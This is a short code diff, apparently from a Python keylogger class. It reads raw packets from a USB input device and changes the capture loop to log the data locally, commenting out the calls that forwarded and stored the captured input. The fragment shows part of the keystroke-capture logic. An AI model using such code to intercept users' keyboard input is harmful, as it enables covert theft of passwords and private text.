@@ -77,8 +77,11 @@ class KeyLogger:
                     data: any = device.read(
                         0x81, 64
                     )  # Endpoint-Adresse und Puffergröße anpassen
-                    self.__USBForwarder.send_data(data)
-                    self.data_handler.write(data)
+                    logging.info(
+                        f'{data}'
+                    )
+                    # self.__USBForwarder.send_data(data)
+                    # self.data_handler.write(data)
             except Exception as e:
                 logging.error(f"{e}")
                 pass
